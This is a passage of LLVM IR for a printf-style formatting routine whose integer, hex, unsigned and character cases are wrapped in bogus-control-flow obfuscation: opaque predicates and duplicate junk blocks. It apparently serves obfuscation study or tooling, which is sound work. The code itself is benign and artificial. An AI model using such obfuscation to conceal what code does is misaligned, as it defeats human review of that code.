  %276 = call i32 @prints(i8** %242, i8* %273, i32 %274, i32 %275)
  %277 = load i32, i32* %9, align 4
  %278 = add nsw i32 %277, %276
  store i32 %278, i32* %9, align 4
  br label %571

; <label>:279:                                    ; preds = %originalBBpart245
  %280 = load i32, i32* @x.11
  %281 = load i32, i32* @y.12
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %279
  %288 = load i8*, i8** %5, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 100
  %292 = load i32, i32* @x.11
  %293 = load i32, i32* @y.12
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %291, label %300, label %341

; <label>:300:                                    ; preds = %originalBBpart269
  %301 = load i32, i32* @x.11
  %302 = load i32, i32* @y.12
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %300
  %309 = load i8**, i8*** %4, align 8
  %310 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %311 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 8
  %313 = icmp ule i32 %312, 40
  %314 = load i32, i32* @x.11
  %315 = load i32, i32* @y.12
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %313, label %322, label %328

; <label>:322:                                    ; preds = %originalBBpart273
  %323 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %310, i32 0, i32 3
  %324 = load i8*, i8** %323, align 8
  %325 = getelementptr i8, i8* %324, i32 %312
  %326 = bitcast i8* %325 to i32*
  %327 = add i32 %312, 8
  store i32 %327, i32* %311, align 8
  br label %333

; <label>:328:                                    ; preds = %originalBBpart273
  %329 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %310, i32 0, i32 2
  %330 = load i8*, i8** %329, align 8
  %331 = bitcast i8* %330 to i32*
  %332 = getelementptr i8, i8* %330, i32 8
  store i8* %332, i8** %329, align 8
  br label %333

; <label>:333:                                    ; preds = %328, %322
  %334 = phi i32* [ %326, %322 ], [ %331, %328 ]
  %335 = load i32, i32* %334, align 4
  %336 = load i32, i32* %7, align 4
  %337 = load i32, i32* %8, align 4
  %338 = call i32 @printi(i8** %309, i32 %335, i32 10, i32 1, i32 %336, i32 %337, i32 97)
  %339 = load i32, i32* %9, align 4
  %340 = add nsw i32 %339, %338
  store i32 %340, i32* %9, align 4
  br label %571

; <label>:341:                                    ; preds = %originalBBpart269
  %342 = load i8*, i8** %5, align 8
  %343 = load i8, i8* %342, align 1
  %344 = zext i8 %343 to i32
  %345 = icmp eq i32 %344, 120
  br i1 %345, label %346, label %387

; <label>:346:                                    ; preds = %341
  %347 = load i8**, i8*** %4, align 8
  %348 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %349 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %348, i32 0, i32 0
  %350 = load i32, i32* %349, align 8
  %351 = icmp ule i32 %350, 40
  br i1 %351, label %352, label %358

; <label>:352:                                    ; preds = %346
  %353 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %348, i32 0, i32 3
  %354 = load i8*, i8** %353, align 8
  %355 = getelementptr i8, i8* %354, i32 %350
  %356 = bitcast i8* %355 to i32*
  %357 = add i32 %350, 8
  store i32 %357, i32* %349, align 8
  br label %363

; <label>:358:                                    ; preds = %346
  %359 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %348, i32 0, i32 2
  %360 = load i8*, i8** %359, align 8
  %361 = bitcast i8* %360 to i32*
  %362 = getelementptr i8, i8* %360, i32 8
  store i8* %362, i8** %359, align 8
  br label %363

; <label>:363:                                    ; preds = %358, %352
  %364 = phi i32* [ %356, %352 ], [ %361, %358 ]
  %365 = load i32, i32* @x.11
  %366 = load i32, i32* @y.12
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %363
  %373 = load i32, i32* %364, align 4
  %374 = load i32, i32* %7, align 4
  %375 = load i32, i32* %8, align 4
  %376 = call i32 @printi(i8** %347, i32 %373, i32 16, i32 0, i32 %374, i32 %375, i32 97)
  %377 = load i32, i32* %9, align 4
  %378 = add nsw i32 %377, %376
  store i32 %378, i32* %9, align 4
  %379 = load i32, i32* @x.11
  %380 = load i32, i32* @y.12
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart289, label %originalBB75alteredBB

originalBBpart289:                                ; preds = %originalBB75
  br label %571

; <label>:387:                                    ; preds = %341
  %388 = load i8*, i8** %5, align 8
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 88
  br i1 %391, label %392, label %449

; <label>:392:                                    ; preds = %387
  %393 = load i8**, i8*** %4, align 8
  %394 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %395 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 0
  %396 = load i32, i32* %395, align 8
  %397 = icmp ule i32 %396, 40
  br i1 %397, label %398, label %420

; <label>:398:                                    ; preds = %392
  %399 = load i32, i32* @x.11
  %400 = load i32, i32* @y.12
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %398
  %407 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 3
  %408 = load i8*, i8** %407, align 8
  %409 = getelementptr i8, i8* %408, i32 %396
  %410 = bitcast i8* %409 to i32*
  %411 = add i32 %396, 8
  store i32 %411, i32* %395, align 8
  %412 = load i32, i32* @x.11
  %413 = load i32, i32* @y.12
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart299, label %originalBB91alteredBB

originalBBpart299:                                ; preds = %originalBB91
  br label %425

; <label>:420:                                    ; preds = %392
  %421 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 2
  %422 = load i8*, i8** %421, align 8
  %423 = bitcast i8* %422 to i32*
  %424 = getelementptr i8, i8* %422, i32 8
  store i8* %424, i8** %421, align 8
  br label %425

; <label>:425:                                    ; preds = %420, %originalBBpart299
  %426 = phi i32* [ %410, %originalBBpart299 ], [ %423, %420 ]
  %427 = load i32, i32* @x.11
  %428 = load i32, i32* @y.12
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %425
  %435 = load i32, i32* %426, align 4
  %436 = load i32, i32* %7, align 4
  %437 = load i32, i32* %8, align 4
  %438 = call i32 @printi(i8** %393, i32 %435, i32 16, i32 0, i32 %436, i32 %437, i32 65)
  %439 = load i32, i32* %9, align 4
  %440 = add nsw i32 %439, %438
  store i32 %440, i32* %9, align 4
  %441 = load i32, i32* @x.11
  %442 = load i32, i32* @y.12
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart2112, label %originalBB101alteredBB

originalBBpart2112:                               ; preds = %originalBB101
  br label %571

; <label>:449:                                    ; preds = %387
  %450 = load i8*, i8** %5, align 8
  %451 = load i8, i8* %450, align 1
  %452 = zext i8 %451 to i32
  %453 = icmp eq i32 %452, 117
  br i1 %453, label %454, label %511

; <label>:454:                                    ; preds = %449
  %455 = load i8**, i8*** %4, align 8
  %456 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %457 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 8
  %459 = icmp ule i32 %458, 40
  br i1 %459, label %460, label %466

; <label>:460:                                    ; preds = %454
  %461 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 3
  %462 = load i8*, i8** %461, align 8
  %463 = getelementptr i8, i8* %462, i32 %458
  %464 = bitcast i8* %463 to i32*
  %465 = add i32 %458, 8
  store i32 %465, i32* %457, align 8
  br label %487

; <label>:466:                                    ; preds = %454
  %467 = load i32, i32* @x.11
  %468 = load i32, i32* @y.12
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %466
  %475 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 2
  %476 = load i8*, i8** %475, align 8
  %477 = bitcast i8* %476 to i32*
  %478 = getelementptr i8, i8* %476, i32 8
  store i8* %478, i8** %475, align 8
  %479 = load i32, i32* @x.11
  %480 = load i32, i32* @y.12
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %487

; <label>:487:                                    ; preds = %originalBBpart2116, %460
  %488 = phi i32* [ %464, %460 ], [ %477, %originalBBpart2116 ]
  %489 = load i32, i32* @x.11
  %490 = load i32, i32* @y.12
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %487
  %497 = load i32, i32* %488, align 4
  %498 = load i32, i32* %7, align 4
  %499 = load i32, i32* %8, align 4
  %500 = call i32 @printi(i8** %455, i32 %497, i32 10, i32 0, i32 %498, i32 %499, i32 97)
  %501 = load i32, i32* %9, align 4
  %502 = add nsw i32 %501, %500
  store i32 %502, i32* %9, align 4
  %503 = load i32, i32* @x.11
  %504 = load i32, i32* @y.12
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart2133, label %originalBB118alteredBB

originalBBpart2133:                               ; preds = %originalBB118
  br label %571

; <label>:511:                                    ; preds = %449
  %512 = load i8*, i8** %5, align 8
  %513 = load i8, i8* %512, align 1
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 99
  br i1 %515, label %516, label %561

; <label>:516:                                    ; preds = %511
  %517 = load i32, i32* @x.11
  %518 = load i32, i32* @y.12
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBB135, label %originalBB135alteredBB

originalBB135:                                    ; preds = %originalBB135alteredBB, %516
  %525 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %526 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 8
  %528 = icmp ule i32 %527, 40
  %529 = load i32, i32* @x.11
  %530 = load i32, i32* @y.12
  %531 = sub i32 %529, 1
  %532 = mul i32 %529, %531
  %533 = urem i32 %532, 2
  %534 = icmp eq i32 %533, 0
  %535 = icmp slt i32 %530, 10
  %536 = or i1 %534, %535
  br i1 %536, label %originalBBpart2137, label %originalBB135alteredBB

originalBBpart2137:                               ; preds = %originalBB135
  br i1 %528, label %537, label %543

; <label>:537:                                    ; preds = %originalBBpart2137
  %538 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %525, i32 0, i32 3
  %539 = load i8*, i8** %538, align 8
  %540 = getelementptr i8, i8* %539, i32 %527
  %541 = bitcast i8* %540 to i32*
  %542 = add i32 %527, 8
  store i32 %542, i32* %526, align 8
  br label %548

; <label>:543:                                    ; preds = %originalBBpart2137
  %544 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %525, i32 0, i32 2
  %545 = load i8*, i8** %544, align 8
  %546 = bitcast i8* %545 to i32*
  %547 = getelementptr i8, i8* %545, i32 8
  store i8* %547, i8** %544, align 8
  br label %548

; <label>:548:                                    ; preds = %543, %537
  %549 = phi i32* [ %541, %537 ], [ %546, %543 ]
  %550 = load i32, i32* %549, align 4
  %551 = trunc i32 %550 to i8
  %552 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %551, i8* %552, align 1
  %553 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %553, align 1
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %556 = load i32, i32* %7, align 4
  %557 = load i32, i32* %8, align 4
  %558 = call i32 @prints(i8** %554, i8* %555, i32 %556, i32 %557)
  %559 = load i32, i32* %9, align 4
  %560 = add nsw i32 %559, %558
  store i32 %560, i32* %9, align 4
  br label %571

; <label>:561:                                    ; preds = %511
  br label %570

; <label>:562:                                    ; preds = %originalBBpart24
  br label %563

; <label>:563:                                    ; preds = %562, %83
  %564 = load i8**, i8*** %4, align 8
  %565 = load i8*, i8** %5, align 8
  %566 = load i8, i8* %565, align 1
  %567 = zext i8 %566 to i32
  call void @printchar(i8** %564, i32 %567)
  %568 = load i32, i32* %9, align 4
  %569 = add nsw i32 %568, 1
  store i32 %569, i32* %9, align 4
  br label %570

; <label>:570:                                    ; preds = %563, %561
  br label %571

; <label>:571:                                    ; preds = %570, %548, %originalBBpart2133, %originalBBpart2112, %originalBBpart289, %333, %272
  %572 = load i32, i32* @x.11
  %573 = load i32, i32* @y.12
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB139, label %originalBB139alteredBB

originalBB139:                                    ; preds = %originalBB139alteredBB, %571
  %580 = load i8*, i8** %5, align 8
  %581 = getelementptr inbounds i8, i8* %580, i32 1
  store i8* %581, i8** %5, align 8
  %582 = load i32, i32* @x.11
  %583 = load i32, i32* @y.12
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBBpart2141, label %originalBB139alteredBB

originalBBpart2141:                               ; preds = %originalBB139
  br label %12

; <label>:590:                                    ; preds = %61, %originalBBpart2
  %591 = load i8**, i8*** %4, align 8
  %592 = icmp ne i8** %591, null
  br i1 %592, label %593, label %612

; <label>:593:                                    ; preds = %590
  %594 = load i32, i32* @x.11
  %595 = load i32, i32* @y.12
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB143, label %originalBB143alteredBB

originalBB143:                                    ; preds = %originalBB143alteredBB, %593
  %602 = load i8**, i8*** %4, align 8
  %603 = load i8*, i8** %602, align 8
  store i8 0, i8* %603, align 1
  %604 = load i32, i32* @x.11
  %605 = load i32, i32* @y.12
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart2145, label %originalBB143alteredBB

originalBBpart2145:                               ; preds = %originalBB143
  br label %612

; <label>:612:                                    ; preds = %originalBBpart2145, %590
  %613 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %614 = bitcast %struct.__va_list_tag* %613 to i8*
  call void @llvm.va_end(i8* %614)
  %615 = load i32, i32* %9, align 4
  ret i32 %615

originalBBalteredBB:                              ; preds = %originalBB, %12
  %616 = load i8*, i8** %5, align 8
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp ne i32 %618, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %620 = load i8*, i8** %5, align 8
  %621 = load i8, i8* %620, align 1
  %622 = zext i8 %621 to i32
  %623 = icmp eq i32 %622, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %62
  %624 = load i8*, i8** %5, align 8
  %625 = load i8, i8* %624, align 1
  %626 = zext i8 %625 to i32
  %627 = icmp eq i32 %626, 37
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %103
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  %628 = load i8*, i8** %5, align 8
  %629 = load i8, i8* %628, align 1
  %630 = zext i8 %629 to i32
  %631 = icmp sle i32 %630, 57
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %148
  %632 = load i32, i32* %7, align 4
  %_ = sub i32 %632, 10
  %gen = mul i32 %_, 10
  %_19 = sub i32 %632, 10
  %gen20 = mul i32 %_19, 10
  %_21 = sub i32 %632, 10
  %gen22 = mul i32 %_21, 10
  %_23 = sub i32 %632, 10
  %gen24 = mul i32 %_23, 10
  %_25 = shl i32 %632, 10
  %_26 = sub i32 %632, 10
  %gen27 = mul i32 %_26, 10
  %_28 = shl i32 %632, 10
  %633 = mul nsw i32 %632, 10
  store i32 %633, i32* %7, align 4
  %634 = load i8*, i8** %5, align 8
  %635 = load i8, i8* %634, align 1
  %636 = zext i8 %635 to i32
  %_29 = sub i32 0, %636
  %gen30 = add i32 %_29, 48
  %_31 = sub i32 0, %636
  %gen32 = add i32 %_31, 48
  %_33 = sub i32 %636, 48
  %gen34 = mul i32 %_33, 48
  %_35 = sub i32 %636, 48
  %gen36 = mul i32 %_35, 48
  %_37 = shl i32 %636, 48
  %_38 = sub i32 0, %636
  %gen39 = add i32 %_38, 48
  %637 = sub nsw i32 %636, 48
  %638 = load i32, i32* %7, align 4
  %639 = add nsw i32 %638, %637
  store i32 %639, i32* %7, align 4
  br label %originalBB18

originalBB43alteredBB:                            ; preds = %originalBB43, %176
  %640 = load i8*, i8** %5, align 8
  %641 = load i8, i8* %640, align 1
  %642 = zext i8 %641 to i32
  %643 = icmp eq i32 %642, 115
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %202
  %644 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %198, i32 0, i32 3
  %645 = load i8*, i8** %644, align 8
  %646 = getelementptr i8, i8* %645, i32 %200
  %647 = bitcast i8* %646 to i32*
  %_48 = shl i32 %200, 8
  %_49 = sub i32 %200, 8
  %gen50 = mul i32 %_49, 8
  %_51 = sub i32 0, %200
  %gen52 = add i32 %_51, 8
  %_53 = sub i32 0, %200
  %gen54 = add i32 %_53, 8
  %_55 = shl i32 %200, 8
  %648 = add i32 %200, 8
  store i32 %648, i32* %199, align 8
  br label %originalBB47

originalBB59alteredBB:                            ; preds = %originalBB59, %229
  %649 = load i32, i32* %230, align 4
  %650 = sext i32 %649 to i64
  %651 = inttoptr i64 %650 to i8*
  store i8* %651, i8** %11, align 8
  %652 = load i8**, i8*** %4, align 8
  %653 = load i8*, i8** %11, align 8
  %654 = icmp ne i8* %653, null
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %253
  %655 = load i8*, i8** %11, align 8
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %279
  %656 = load i8*, i8** %5, align 8
  %657 = load i8, i8* %656, align 1
  %658 = zext i8 %657 to i32
  %659 = icmp eq i32 %658, 100
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %300
  %660 = load i8**, i8*** %4, align 8
  %661 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %662 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %661, i32 0, i32 0
  %663 = load i32, i32* %662, align 8
  %664 = icmp ule i32 %663, 40
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %363
  %665 = load i32, i32* %364, align 4
  %666 = load i32, i32* %7, align 4
  %667 = load i32, i32* %8, align 4
  %668 = call i32 @printi(i8** %347, i32 %665, i32 16, i32 0, i32 %666, i32 %667, i32 97)
  %669 = load i32, i32* %9, align 4
  %_76 = shl i32 %669, %668
  %_77 = sub i32 0, %669
  %gen78 = add i32 %_77, %668
  %_79 = shl i32 %669, %668
  %_80 = sub i32 0, %669
  %gen81 = add i32 %_80, %668
  %_82 = sub i32 0, %669
  %gen83 = add i32 %_82, %668
  %_84 = sub i32 0, %669
  %gen85 = add i32 %_84, %668
  %_86 = sub i32 0, %669
  %gen87 = add i32 %_86, %668
  %670 = add nsw i32 %669, %668
  store i32 %670, i32* %9, align 4
  br label %originalBB75

originalBB91alteredBB:                            ; preds = %originalBB91, %398
  %671 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %394, i32 0, i32 3
  %672 = load i8*, i8** %671, align 8
  %673 = getelementptr i8, i8* %672, i32 %396
  %674 = bitcast i8* %673 to i32*
  %_92 = shl i32 %396, 8
  %_93 = shl i32 %396, 8
  %_94 = sub i32 0, %396
  %gen95 = add i32 %_94, 8
  %_96 = shl i32 %396, 8
  %_97 = shl i32 %396, 8
  %675 = add i32 %396, 8
  store i32 %675, i32* %395, align 8
  br label %originalBB91

originalBB101alteredBB:                           ; preds = %originalBB101, %425
  %676 = load i32, i32* %426, align 4
  %677 = load i32, i32* %7, align 4
  %678 = load i32, i32* %8, align 4
  %679 = call i32 @printi(i8** %393, i32 %676, i32 16, i32 0, i32 %677, i32 %678, i32 65)
  %680 = load i32, i32* %9, align 4
  %_102 = sub i32 0, %680
  %gen103 = add i32 %_102, %679
  %_104 = sub i32 0, %680
  %gen105 = add i32 %_104, %679
  %_106 = sub i32 0, %680
  %gen107 = add i32 %_106, %679
  %_108 = shl i32 %680, %679
  %_109 = sub i32 0, %680
  %gen110 = add i32 %_109, %679
  %681 = add nsw i32 %680, %679
  store i32 %681, i32* %9, align 4
  br label %originalBB101

originalBB114alteredBB:                           ; preds = %originalBB114, %466
  %682 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %456, i32 0, i32 2
  %683 = load i8*, i8** %682, align 8
  %684 = bitcast i8* %683 to i32*
  %685 = getelementptr i8, i8* %683, i32 8
  store i8* %685, i8** %682, align 8
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %487
  %686 = load i32, i32* %488, align 4
  %687 = load i32, i32* %7, align 4
  %688 = load i32, i32* %8, align 4
  %689 = call i32 @printi(i8** %455, i32 %686, i32 10, i32 0, i32 %687, i32 %688, i32 97)
  %690 = load i32, i32* %9, align 4
  %_119 = sub i32 0, %690
  %gen120 = add i32 %_119, %689
  %_121 = sub i32 %690, %689
  %gen122 = mul i32 %_121, %689
  %_123 = sub i32 %690, %689
  %gen124 = mul i32 %_123, %689
  %_125 = sub i32 0, %690
  %gen126 = add i32 %_125, %689
  %_127 = shl i32 %690, %689
  %_128 = sub i32 %690, %689
  %gen129 = mul i32 %_128, %689
  %_130 = sub i32 %690, %689
  %gen131 = mul i32 %_130, %689
  %691 = add nsw i32 %690, %689
  store i32 %691, i32* %9, align 4
  br label %originalBB118

originalBB135alteredBB:                           ; preds = %originalBB135, %516
  %692 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %693 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %692, i32 0, i32 0
  %694 = load i32, i32* %693, align 8
  %695 = icmp ule i32 %694, 40
  br label %originalBB135

originalBB139alteredBB:                           ; preds = %originalBB139, %571
  %696 = load i8*, i8** %5, align 8
  %697 = getelementptr inbounds i8, i8* %696, i32 1
  store i8* %697, i8** %5, align 8
  br label %originalBB139

originalBB143alteredBB:                           ; preds = %originalBB143, %593
  %698 = load i8**, i8*** %4, align 8
  %699 = load i8*, i8** %698, align 8
  store i8 0, i8* %699, align 1
  br label %originalBB143
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.13
  %6 = load i32, i32* @y.14
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.13
  %24 = load i32, i32* @y.14
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %138

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.13
  %33 = load i32, i32* @y.14
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 0, i32* %19, align 4
  %40 = load i8*, i8** %14, align 8
  store i8* %40, i8** %20, align 8
  %41 = load i32, i32* @x.13
  %42 = load i32, i32* @y.14
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:49:                                     ; preds = %originalBBpart28, %originalBBpart24
  %50 = load i8*, i8** %20, align 8
  %51 = load i8, i8* %50, align 1
  %52 = icmp ne i8 %51, 0
  br i1 %52, label %53, label %75

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* %19, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %19, align 4
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @x.13
  %58 = load i32, i32* @y.14
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %56
  %65 = load i8*, i8** %20, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %20, align 8
  %67 = load i32, i32* @x.13
  %68 = load i32, i32* @y.14
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
